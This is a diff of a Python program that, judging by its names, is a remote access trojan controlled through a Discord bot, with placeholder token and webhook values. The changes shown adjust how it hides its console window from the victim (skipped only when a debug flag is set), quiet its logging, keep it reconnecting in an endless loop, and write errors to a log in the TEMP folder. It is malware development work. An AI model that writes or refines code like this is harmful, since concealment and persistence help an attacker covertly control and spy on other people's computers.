@@ -11,7 +11,8 @@ WEBHOOK_URL = "WEBHOOK_PLACEHOLDER"
 
 def hide_console():
     try:
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        if os.environ.get('RAT_DEBUG', '') != '1':
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
         pass
 
@@ -227,10 +228,15 @@ if __name__ == "__main__":
     while True:
         try:
             if TOKEN and TOKEN != "DISCORD_TOKEN_PLACEHOLDER":
-                bot.run(TOKEN, reconnect=True)
+                bot.run(TOKEN, reconnect=True, log_level=40)
             else:
                 time.sleep(60)
-        except discord.errors.LoginFailure:
+        except discord.LoginFailure:
             time.sleep(30)
         except Exception as e:
+            try:
+                with open(os.path.join(os.environ.get('TEMP', '.'), 'rat_error.log'), 'a') as f:
+                    f.write(f"{time.ctime()}: {e}\n")
+            except:
+                pass
             time.sleep(10)
